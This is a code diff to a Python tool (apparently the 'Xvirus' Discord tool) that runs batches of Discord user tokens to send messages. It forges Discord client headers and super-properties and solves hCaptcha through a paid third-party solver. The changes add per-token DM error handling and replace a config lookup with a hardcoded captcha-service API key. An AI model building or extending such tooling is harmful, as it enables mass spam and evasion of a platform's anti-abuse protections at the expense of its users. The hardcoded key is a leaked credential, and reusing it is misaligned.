@@ -31,7 +31,7 @@ import os
 import re
 
 THIS_VERSION = "2.0.1"
-whitelisted = ["1157603083308761118", "1157425827517055017", "1146496916419526727", "1157400926877925558", "1156946611646247013", "1149731357656883311", "322415832275615746"]
+whitelisted = ["1157603083308761118", "1157425827517055017", "1146496916419526727", "1156946611646247013", "1149731357656883311", "322415832275615746"]
 
 class Config:
     def __init__(self):
@@ -72,6 +72,9 @@ class Config:
                 print(f"{Fore.BLUE}<!> Config file is up to date -> {THIS_VERSION}")
                 sleep(1)
             else:
+                key = self._get("xvirus_key")
+                print(f"{Fore.RED}<!> Config File Outdated Please Copey Your Xvirus Key Before Updating -> {Fore.BLUE}{key}")
+                input(f"{Fore.RED}<*> Press ENTER to update config")
                 with open(self.file, 'w') as f:
                     json.dump(self.content, f, indent=3)
                 print(f"{Fore.BLUE}<!> Config file has been updated to the latest and reset.")
@@ -242,6 +245,8 @@ class Output:
             Output("bad", token).log(f"Error -> {token} {Fore.LIGHTBLACK_EX}({res_status_code}) {Fore.RED}(Unknown)")
         elif "\"code\": 50033:" in res_text:
             Output("bad", token).log(f"Error -> {token} {Fore.LIGHTBLACK_EX}({res_status_code}) {Fore.RED}(Invlid Recipient)")
+        elif "Cannot send messages to this user:" in res_text:
+            Output("bad", token).log(f"Error -> {token} {Fore.LIGHTBLACK_EX}({res_status_code}) {Fore.RED}(Disabled DMS)")
         else:
             Output("bad", token).log(f"Error -> {token} {Fore.LIGHTBLACK_EX}({res_status_code}) {Fore.RED}({res_text})")
 
@@ -345,7 +350,7 @@ static_headers = {
     'sec-fetch-site': 'same-origin',
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36',
     'x-debug-options': 'bugReporterEnabled',
-    'x-discord-locale': 'sv-SE',
+    'x-discord-locale': 'en-US',
     'x-discord-timezone': 'Europe/Stockholm',
     'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDE2Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InN2IiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMTYgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMTIgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMTIiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyMTg2MDQsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM1MjM2LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',}
 
@@ -725,7 +730,7 @@ class Captcha_ab5:
 
 class Captcha_dexv:
     def __init__(self, url, sitekey, rqdata=""):
-        self.key = config._get("captcha_key")
+        self.key = "DEXV-ulinfr-eoygs8-kr763i-nl3mt7"
         self.url = url
         self.sitekey = sitekey
         self.rqdata = rqdata
@@ -751,12 +756,12 @@ class Captcha_dexv:
                     Output("bad").log(f"Failed To Solve Captcha -> {Fore.LIGHTBLACK_EX} {response_data}")
                     break
             except requests.RequestException as e:
-                Output("bad").log(f"Failed To Solve Captcha -> {Fore.LIGHTBLACK_EX} {e}")
+                Output("bad").log(f"Failed To Solve Captcha -> {Fore.LIGHTBLACK_EX} API ERROR ")
                 continue
 
     @staticmethod
     def get_captcha_bal():
-        key = config._get("captcha_key")
+        key = "DEXV-ulinfr-eoygs8-kr763i-nl3mt7"
         r = requests.get(f"http://solver.dexv.lol:1000/api/get_balance", json={"key": key})
         bal = r.json()['balance']
         Output("info").notime(f"Captcha Balance: {Fore.RED}${bal}")
@@ -780,6 +785,7 @@ class Captcha:
             return capkey
         else:
             Output("bad").log("Capcha Solver Not Initialized Please Choose Captcha Type In Settings")
+            input()
         
     @staticmethod
     def get_captcha_bal():
@@ -791,3 +797,4 @@ class Captcha:
             Captcha_ab5.get_captcha_bal()
         else:
             Output("bad").log("Capcha Solver Not Initialized Please Choose Captcha Type In Settings")
+            input()
